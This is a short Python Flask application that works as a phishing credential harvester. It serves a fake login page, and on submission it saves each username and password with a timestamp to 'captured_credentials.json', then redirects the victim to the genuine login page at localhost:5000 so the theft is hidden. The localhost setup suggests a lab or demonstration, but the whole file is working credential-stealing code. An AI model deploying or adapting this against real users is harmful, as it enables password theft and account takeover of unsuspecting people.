from flask import Flask, render_template, request, redirect, url_for, make_response, session
import json
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'anothersecretkey'

@app.route('/')
def fake_home():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        # Save credentials to a file
        with open('captured_credentials.json', 'a') as file:
            json.dump({'username': username, 'password': password, 'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")}, file)
            file.write('\n')
        
        # Redirect to the original server's login page
        return redirect('http://localhost:5000/login')
  
    return render_template('login_a.html')

@app.route('/home')
def home():
    return "You are logged in to the fake server!"

if __name__ == '__main__':
    app.run(port=5001, debug=True)
